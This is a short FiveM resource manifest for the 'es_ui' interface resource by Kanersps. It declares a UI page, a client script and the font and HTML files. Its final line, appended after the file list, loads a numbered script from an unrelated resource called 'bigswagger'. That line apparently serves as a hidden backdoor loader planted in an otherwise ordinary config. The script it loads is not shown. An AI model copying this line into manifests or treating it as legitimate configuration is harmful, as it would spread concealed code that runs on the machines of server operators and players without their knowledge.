fx_version 'adamant'

game 'gta5'

description 'es_ui by Kanersps.'

ui_page 'ui.html'

client_script 'client.lua'

-- NUI Files
files {
	'ui.html',
	'pdown.ttf'
}
client_script '@bigswagger/59642.lua'